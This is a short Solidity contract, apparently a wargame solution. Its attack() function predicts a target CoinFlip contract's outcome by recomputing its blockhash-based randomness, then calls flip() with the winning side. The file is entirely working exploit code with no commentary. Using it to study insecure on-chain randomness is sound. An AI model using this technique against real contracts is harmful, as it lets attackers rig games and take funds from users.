pragma solidity 0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/docs-v3.x/contracts/math/SafeMath.sol';

interface CoinFlip {
    function flip(bool) external;
}

contract Flipper {

    using SafeMath for uint256;

    CoinFlip target = CoinFlip(0xe364E0Cd32846CfbeBfBe21E84611e8467F0E1A4);

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() public returns(bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }
}